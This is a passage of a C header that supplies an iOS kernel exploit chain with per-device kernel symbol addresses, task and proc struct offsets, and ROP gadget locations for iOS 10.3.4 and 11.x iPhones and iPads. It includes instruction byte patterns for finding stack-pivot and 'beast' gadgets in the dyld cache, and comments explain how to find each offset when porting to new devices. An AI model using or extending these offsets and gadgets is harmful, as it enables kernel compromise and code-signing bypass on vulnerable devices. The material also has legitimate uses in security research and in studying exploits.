#ifndef OFFSETS_H
#define OFFSETS_H

// If you forget to enable this when you don't have the right offset in stage1.h,
// you'll receive a segfault in stage 1 (KERN_INVALID_ADDRESS) with pc = OFF_BEAST_GADGET since it won't be mapped
#define STAGE1FD_SCREAM_TEST 0

// These are some 32-bit devices to get you started if you want to port it
#define N41AP 0 // iPhone5,1 (iPhone 5, GSM)
#define N42AP 0 // iPhone5,2 (iPhone 5, Global)
#define N48AP 0 // iPhone5,3 (iPhone 5c, GSM)
#define N49AP 0 // iPhone5,4 (iPhone 5c, Global)

// Define devices
#define J71AP 0 // iPad4,1 (iPad Air 1st gen, Wi-Fi)
#define J72AP 0 // iPad4,2 (iPad Air 1st gen, cellular)
#define J73AP 0 // iPad4,3 (iPad Air 1st gen, China)
#define J85AP 0 // iPad4,4 (iPad mini 2, Wi-Fi)
#define J86AP 0 // iPad4,5 (iPad mini 2, cellular)
#define J87AP 0 // iPad4,6 (iPad mini 2, China)
#define J85mAP 0 // iPad4,7 (iPad mini 3, Wi-Fi)
#define J86mAP 0 // iPad4,8 (iPad mini 3, cellular)
#define J87mAP 0 // iPad4,9 (iPad mini 3, China)
#define J96AP 0 // iPad5,1 (iPad mini 4, Wi-Fi)
#define J97AP 0 // iPad5,2 (iPad mini 4, cellular)
#define J81AP 0 // iPad5,3 (iPad Air 2, Wi-Fi)
#define J82AP 0 // iPad5,4 (iPad Air 2, cellular)
#define J127AP 0 // iPad6,3 (iPad Pro 9.7, Wi-Fi)
#define J128AP 0 // iPad6,4 (iPad Pro 9.7, cellular)
#define J98aAP 0 // iPad6,7 (iPad Pro 12.9, Wi-Fi)
#define J99aAP 0 // iPad6,8 (iPad Pro 12.9, cellular)
#define J71sAP 0 // iPad6,11 (iPad 5, Wi-Fi)
#define J71tAP J71sAP // Not sure what the difference is but it's irrelevant for us
#define J72sAP 0 // iPad6,12 (iPad 5, cellular)
#define J72tAP J72sAP // Not sure what the difference is but it's irrelevant for us

#define N51AP 0 // iPhone6,1 (iPhone 5s, GSM)
#define N53AP 0 // iPhone6,2 (iPhone 5s, Global)
#define N56AP 0 // iPhone7,1 (iPhone 6 Plus)
#define N61AP 0 // iPhone7,2 (iPhone 6)
#define N71AP 0 // iPhone8,1 (iPhone 6s)
#define N66AP 1 // iPhone8,2 (iPhone 6s Plus)
#define N66mAP N66AP // the difference between S8000 and S8003 is not significant for us
#define N69AP 0 // iPhone8,4 (iPhone SE 1st gen)
#define N69uAP N69AP // the difference between S8000 and S8003 is not significant for us

#define N102AP 0 // iPod7,1 (iPod touch 6th gen)

// Define OS versions
#define IOS_10_3_4 0
#define IOS_11_0 0
#define IOS_11_0_1 0
#define IOS_11_0_2 0
#define IOS_11_0_3 0
#define IOS_11_1 0
#define IOS_11_1_1 0
#define IOS_11_1_2 0
#define IOS_11_2 0
#define IOS_11_2_1 0
#define IOS_11_2_2 0
#define IOS_11_2_5 0
#define IOS_11_2_6 0
#define IOS_11_3 0
#define IOS_11_3_1 1
#define IOS_11_4 0
#define IOS_11_4_1 0

#ifdef __LP64__
typedef uint64_t kptr_t;
#else
typedef uint32_t kptr_t;
#endif

typedef uint64_t mach_port_poly_t; // We don't know what it is, but apparently a uint64_t works

typedef struct {
    struct {
        kptr_t kernel_image_base;
    } constant;

    struct {
        kptr_t copyin; // formerly duplicate
        kptr_t copyout;
        kptr_t current_task;
        kptr_t get_bsdtask_info;
        kptr_t vm_map_wire_external;
        kptr_t vfs_context_current;
        kptr_t vnode_lookup;
        kptr_t osunserializexml;
        kptr_t smalloc;
        kptr_t proc_find; // not set in stage2.m version
        kptr_t proc_rele; // not set in stage2.m version

        kptr_t ipc_port_alloc_special;
        kptr_t ipc_kobject_set;
        kptr_t ipc_port_make_send;
    } funcs;

    struct {
        kptr_t add_x0_x0_ret; // formerly duplicate
    } gadgets;

    struct {
        kptr_t realhost;
        kptr_t zone_map;
        kptr_t kernel_task;
        kptr_t kern_proc;
        kptr_t rootvnode;
        kptr_t osboolean_true;
        kptr_t trust_cache; // formerly duplicate
    } data;

    struct {
        kptr_t iosurface_root_userclient;
    } vtabs;

    struct {
        uint32_t is_task_offset; // formerly duplicate
        uint32_t task_itk_self;
        uint32_t itk_registered; // formerly duplicate
        uint32_t ipr_size; // formerly duplicate
        uint32_t sizeof_task;
        uint32_t proc_task; // not set in stage2.m version
        uint32_t proc_p_csflags; // not set in stage2.m version
        uint32_t task_t_flags; // not set in stage2.m version
        uint32_t task_all_image_info_addr;
        uint32_t task_all_image_info_size;
    } struct_offsets;

    struct {
        uint32_t create_outsize;
        uint32_t create_surface;
        uint32_t set_value;
    } iosurface;

#ifndef IOKIT_H
#define io_connect_t mach_port_t
#define task_t void*
#define vm_map_t mach_port_t
#define vm_prot_t int
#define vm_inherit_t unsigned int
#define ipc_space_t void*
#endif
    struct {
        // void (*write) (int fd,void * buf,uint64_t size); // unused, dlsym of _write
        kern_return_t (*IOConnectTrap6)(io_connect_t connect, uint32_t selector, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6);
        kern_return_t (*mach_ports_lookup)(task_t target_task, mach_port_array_t init_port_set, mach_msg_type_number_t* init_port_count);
        mach_port_name_t (*mach_task_self)();
        kern_return_t (*mach_vm_remap)(vm_map_t target_task, mach_vm_address_t* target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t* cur_protection, vm_prot_t* max_protection, vm_inherit_t inheritance);
        kern_return_t (*mach_port_destroy)(ipc_space_t task, mach_port_name_t name);
        kern_return_t (*mach_port_deallocate)(ipc_space_t task, mach_port_name_t name);
        kern_return_t (*mach_port_allocate)(ipc_space_t task, mach_port_right_t right, mach_port_name_t* name);
        kern_return_t (*mach_port_insert_right)(ipc_space_t task, mach_port_name_t name, mach_port_poly_t right, mach_msg_type_name_t right_type);
        kern_return_t (*mach_ports_register)(task_t target_task, mach_port_array_t init_port_set, uint64_t /*???target_task*/ init_port_array_count);
        mach_msg_return_t (*mach_msg)(mach_msg_header_t* msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t receive_limit, mach_port_t receive_name, mach_msg_timeout_t timeout, mach_port_t notify);
        int (*posix_spawn)(uint64_t pid, const char* path, void*, void*, char* const argv[], char* const envp[]);
    } userland_funcs;
#ifndef IOKIT_H
#undef io_connect_t
#undef task_t
#undef vm_map_t
#undef vm_prot_t
#undef vm_inherit_t
#undef ipc_space_t
#endif
} offsets_t;

// iPhone 5 (GSM) (iPhone5,1), iOS 10.3.4
#if (N41AP & IOS_10_3_4)
#define OFF_KERNEL_IMAGE_BASE 0x80001000 // static
#define OFF_COPYIN 0x80007b9c // symbol (_copyin)
#define OFF_COPYOUT 0x80007c74 // symbol (_copyout)
#define OFF_CURRENT_TASK 0x8004bd9c // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0x8005c8c2 // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0x80091b16 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0x8011307e // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0x800fe61c // symbol (_vnode_lookup)
#define OFF_OSUNSERIALIZEXML 0x8030a478 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0x8027cfbe // symbol (_proc_find)
#define OFF_PROC_RELE 0x8027cf52 // symbol (_proc_rele)
#define OFF_SMALLOC 0x80fbf410 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0x80019034 // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0x800290b6 // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0x80018c54 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0x8025f6bc // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0x80456030 // symbol (_kernel_task)
#define OFF_KERN_PROC 0x80456144 // symbol (_kernproc)
#define OFF_ROOTVNODE 0x80456138 // symbol (_rootvnode)
#define OFF_REALHOST 0x80404150 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0x804188e0 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0x80453fa0 // __ZN9OSBoolean11withBooleanEb -> first adrp addr (isn't used anywhere tho)
#define OFF_TRUST_CACHE 0x80809c44 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0x8066bba8 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x18 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0x9c // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x1dc // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x4 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x3b0 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0xc // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x1b8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x248 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x250 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x258 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0x3c8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_SET_VALUE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
// #define OFF_ANCHOR                                                         0xffffffff // TODO: "unable to determine boot cpu!", [x*, 0x78]
#define OFF_IOUC_IPC 0x5c

#define OFF_ISAKMP_CFG_CONFIG_DNS4 0x000b9c08 + 0x8 // second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
#define OFF_LCCONF 0x000b908c // "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit)
#define OFF_DNS4_ARRAY_TO_LCCONF -(OFF_ISAKMP_CFG_CONFIG_DNS4 - OFF_LCCONF) // -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr())
// #define OFF_STR_BUFF                                                                8 // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know it's offset)
// #define OFF_MAX_SLIDE                                                       0x4808000 // read 8 bytes at OFF_OLD_CACHE_ADDR + 0xf0
// #define OFF_SLIDE_VALUE                                                        0x4000 // hardcode that one
// #define OFF_PIVOT_X21                                                     0x199bb31a8 // search a8 06 40 f9 09 01 40 f9 29 1d 40 f9 e1 03 00 aa e0 03 08 aa 20 01 3f d6
// #define OFF_PIVOT_X21_X9                                                    0x50-0x38 // this is not needed on 11.1.2 but because 11.3.1 and above lack the original x21 gadget we need to introduce that one here
// #define OFF_MEMMOVE                                                       0x1ab688d20 // strlcpy second branch
#define OFF_LCCONF_COUNTER 0xa0 // "error allocating splitdns list buffer", switch case 0x87 below, first str offset
// #define OFF_CACHE_TEXT_SEG_SIZE                                            0x30000000 // we can get that by parsing the segments from the cache (but this is always enough)
// #define OFF_OLD_CACHE_ADDR                                                0x180000000 // the first unslid address of the dyld shared cache
// #define OFF_NEW_CACHE_ADDR                                                0x1c0000000 // you might want to change this because it might not work on the 5S but it should be fine for us
// #define OFF_BEAST_GADGET                                                  0x1a1639494 // search the dyld cache for e4 03 16 aa e5 03 14 aa e6 03 15 aa e7 03 13 aa e0 03 1a aa e1 03 19 aa e2 03 18 aa e3 03 17 aa 60 03 3f d6 fd 7b 47 a9 f4 4f 46 a9 f6 57 45 a9 f8 5f 44 a9 fa 67 43 a9 fc 6f 42 a9 e9 23 41 6d ff 03 02 91 c0 03 5f d6
// #define OFF_STR_X0_GADGET                                                 0x197d94ac8 // search the dyld cache for 60 16 00 f9 00 00 80 52 fd 7b 41 a9 f4 4f c2 a8 c0 03 5f d6
// #define OFF_STR_X0_GADGET_OFF                                                    0x28 // based on the gadget above (at which offset it stores x0 basically)
// #define OFF_CBZ_X0_GADGET                                                 0x188cffe5c // __ZN3rtc9TaskQueue12QueueContext13DeleteContextEPv
// #define OFF_CBZ_X0_X16_LOAD                                         0x1b1c16000+0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
// #define OFF_ADD_X0_GADGET                                                 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
// #define OFF_ERRNO             0x1b30f9000+0xff8+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
// #define OFF_NDR_RECORD              0x1b189e018+OFF_NEW_CACHE_ADDR-OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
// #define OFF_LONGJMP                                                       0x180b126e8 // dlsym of __longjmp
// #define OFF_STACK_PIVOT                                                   0x180b12714 // longjmp from mov sp, x2
// #define OFF_MMAP                                                          0x18097cbf4 // dlsym of ___mmap
// #define OFF_MEMCPY                                                        0x18095d634 // dlsym of _memcpy
// #define OFF_OPEN                                                          0x18097ce58 // dlsym of ___open
// #define OFF_FCNTL_RAW                                                     0x18097c434 // dlsym of ___fcntl
// #define OFF_RAW_MACH_VM_REMAP                                             0x18097bb58 // dlsym of _mach_vm_remap
#define OFF_ROOTDOMAINUC_VTAB 0x803e039c // find __ZTV20RootDomainUserClient in kernel, first non-zero byte
#define OFF_SWAPPREFIX_ADDR 0x80394f91 // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel that's the right address

// iPhone 6S Plus (iPhone8,2), iOS 11.3.1
#elif (N66AP & IOS_11_3_1)
#define OFF_KERNEL_IMAGE_BASE 0xfffffff007004000 // static
#define OFF_COPYIN 0xfffffff0071a7090 // symbol (_copyin)
#define OFF_COPYOUT 0xfffffff0071a72b4 // symbol (_copyout)
#define OFF_CURRENT_TASK 0xfffffff0070f76c4 // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0xfffffff00710cdc0 // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0xfffffff007153484 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0xfffffff0071f9a04 // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0xfffffff0071db710 // symbol (_vnode_lookup)
#define OFF_OSUNSERIALIZEXML 0xfffffff0074e2404 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0xfffffff0073f35b8 // symbol (_proc_find)
#define OFF_PROC_RELE 0xfffffff0073f3528 // symbol (_proc_rele)
#define OFF_SMALLOC 0xfffffff006b18cb0 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070b915c // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0xfffffff0070cf30c // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0xfffffff0070b88d8 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0xfffffff0073c96a8 // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0xfffffff0075d5048 // symbol (_kernel_task)
#define OFF_KERN_PROC 0xfffffff0075d50a0 // symbol (_kernproc)
#define OFF_ROOTVNODE 0xfffffff0075d5088 // symbol (_rootvnode)
#define OFF_REALHOST 0xfffffff0075dab98 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0xfffffff0075f7e50 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0xfffffff007644418 // __ZN9OSBoolean11withBooleanEb -> first adrp addr (isn't used anywhere tho)
#define OFF_TRUST_CACHE 0xfffffff0076b0ee8 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0xfffffff006e84c50 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x28 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0xe0 // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x2f0 // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x8 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x5c8 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0x18 // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x2a8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x3a0 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x3a8 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x3b0 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0xbc8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_SET_VALUE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
#define OFF_ANCHOR 0x76199d8 // "unable to determine boot cpu!" in kernelcache, [x*, 0x78]
#define OFF_IOUC_IPC 0x9c

#define OFF_ISAKMP_CFG_CONFIG_DNS4 0x100067c10 + 0x8 // second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
#define OFF_LCCONF 0x1000670e0 // "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit)
#define OFF_DNS4_ARRAY_TO_LCCONF -(OFF_ISAKMP_CFG_CONFIG_DNS4 - OFF_LCCONF) // -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr())
#define OFF_STR_BUFF 8 // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know it's offset)
#define OFF_MAX_SLIDE 0x4808000 // read 8 bytes at OFF_OLD_CACHE_ADDR + 0xf0
#define OFF_SLIDE_VALUE 0x4000 // hardcode that one
#define OFF_PIVOT_X21 0x199bb31a8 // search a8 06 40 f9 09 01 40 f9 29 1d 40 f9 e1 03 00 aa e0 03 08 aa 20 01 3f d6
#define OFF_PIVOT_X21_X9 0x50 - 0x38 // this is not needed on 11.1.2 but because 11.3.1 and above lack the original x21 gadget we need to introduce that one here
#define OFF_MEMMOVE 0x1ab688d20 // strlcpy second branch
#define OFF_LCCONF_COUNTER 0x10c // "error allocating splitdns list buffer", switch case 0x87 below, first str offset
#define OFF_CACHE_TEXT_SEG_SIZE 0x30000000 // we can get that by parsing the segments from the cache (but this is always enough)
#define OFF_OLD_CACHE_ADDR 0x180000000 // the first unslid address of the dyld shared cache
#define OFF_NEW_CACHE_ADDR 0x1c0000000 // you might want to change this because it might not work on the 5S but it should be fine for us
#define OFF_BEAST_GADGET 0x1a1639494 // search the dyld cache for e4 03 16 aa e5 03 14 aa e6 03 15 aa e7 03 13 aa e0 03 1a aa e1 03 19 aa e2 03 18 aa e3 03 17 aa 60 03 3f d6 fd 7b 47 a9 f4 4f 46 a9 f6 57 45 a9 f8 5f 44 a9 fa 67 43 a9 fc 6f 42 a9 e9 23 41 6d ff 03 02 91 c0 03 5f d6
#define OFF_STR_X0_GADGET 0x197d94ac8 // search the dyld cache for 60 16 00 f9 00 00 80 52 fd 7b 41 a9 f4 4f c2 a8 c0 03 5f d6
#define OFF_STR_X0_GADGET_OFF 0x28 // based on the gadget above (at which offset it stores x0 basically)
#define OFF_CBZ_X0_GADGET 0x188cffe5c // __ZN3rtc9TaskQueue12QueueContext13DeleteContextEPv
#define OFF_CBZ_X0_X16_LOAD 0x1b1c16000 + 0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
#define OFF_ADD_X0_GADGET 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
#define OFF_ERRNO 0x1b30f9000 + 0xff8 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
#define OFF_NDR_RECORD 0x1b189e018 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
#define OFF_LONGJMP 0x180b126e8 // dlsym of __longjmp
#define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov sp, x2
#define OFF_MMAP 0x18097cbf4 // dlsym of ___mmap
#define OFF_MEMCPY 0x18095d634 // dlsym of _memcpy
#define OFF_OPEN 0x18097ce58 // dlsym of ___open
#define OFF_FCNTL_RAW 0x18097c434 // dlsym of ___fcntl
#define OFF_RAW_MACH_VM_REMAP 0x18097bb58 // dlsym of _mach_vm_remap
#define OFF_ROOTDOMAINUC_VTAB 0xfffffff00708e158 // find __ZTV20RootDomainUserClient in kernel, first non-zero byte
#define OFF_SWAPPREFIX_ADDR 0xfffffff0075a98cc // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel that's the right address

// These aren't strictly necessary, but useful to have one static copy of them for some device
#define OFF_IOCONNECTTRAP6 0x181160730 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _IOConnectTrap6
#define OFF_MACH_PORTS_LOOKUP 0x18095eaf0 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_ports_lookup
#define OFF_MACH_TASK_SELF 0x18097400c + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_task_self
#define OFF_MACH_VM_REMAP OFF_RAW_MACH_VM_REMAP + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // slide _mach_vm_remap
#define OFF_MACH_PORT_DESTROY 0x18095c37c + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_port_destroy
#define OFF_MACH_PORT_DEALLOCATE 0x18095c85c + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_port_deallocate
#define OFF_MACH_PORT_ALLOCATE 0x18095cbe8 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_port_allocate
#define OFF_MACH_PORT_INSERT_RIGHT 0x18095cc44 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_port_insert_right
#define OFF_MACH_PORTS_REGISTER 0x18096c650 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_ports_register
#define OFF_MACH_MSG 0x18095bc38 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _mach_msg
#define OFF_POSIX_SPAWN 0x180976340 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // dlsym of _posix_spawn

// iPad mini 4 (Wi-Fi) (iPad5,1), iOS 11.1.2
#elif (J96AP & IOS_11_1_2)
#define OFF_KERNEL_IMAGE_BASE 0xfffffff007004000 // static
#define OFF_COPYIN 0xfffffff00719e88c // symbol (_copyin)
#define OFF_COPYOUT 0xfffffff00719eab0 // symbol (_copyout)
#define OFF_CURRENT_TASK 0xfffffff0070e8c0c // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0xfffffff0070fe7ec // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0xfffffff007148fe8 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0xfffffff0071f2310 // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0xfffffff0071d3f90 // symbol (_vnode_lookup)
#define OFF_OSUNSERIALIZEXML 0xfffffff0074dd7e4 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0xfffffff0073ed31c // symbol (_proc_find)
#define OFF_PROC_RELE 0xfffffff0073ed28c // symbol (_proc_rele)
#define OFF_SMALLOC 0xfffffff006822cb0 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070ad1a8 // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0xfffffff0070c3148 // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0xfffffff0070ac924 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0xfffffff0063fddbc // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0xfffffff0075d1048 // symbol (_kernel_task)
#define OFF_KERN_PROC 0xfffffff0075d10a0 // symbol (_kernproc)
#define OFF_ROOTVNODE 0xfffffff0075d1088 // symbol (_rootvnode)
#define OFF_REALHOST 0xfffffff0075d6b98 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0xfffffff0075f3e50 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0xfffffff007640468 // __ZN9OSBoolean11withBooleanEb -> first adrp addr
#define OFF_TRUST_CACHE 0xfffffff0076ab828 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0xfffffff006e73590 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x28 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0xd8 // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x2f0 // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x8 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x5c8 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0x18 // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x2a8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x3a0 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x3a8 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x3b0 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0xbc8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_SET_VALUE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
#define OFF_ANCHOR 0x76199d8 // VERIFY: "unable to determine boot cpu!", [x*, 0x78]
#define OFF_IOUC_IPC 0x9c

// iPad mini 4 (Wi-Fi) (iPad5,1), iOS 11.3.1
#elif (J96AP & IOS_11_3_1)
#define OFF_KERNEL_IMAGE_BASE 0xfffffff007004000 // static
#define OFF_COPYIN 0xfffffff0071aa804 // symbol (_copyin)
#define OFF_COPYOUT 0xfffffff0071aaa28 // symbol (_copyout)
#define OFF_CURRENT_TASK 0xfffffff0070f4d80 // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0xfffffff00710a960 // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0xfffffff007154fb8 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0xfffffff0071fe2f0 // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0xfffffff0071dff70 // symbol (_vnode_lookup)
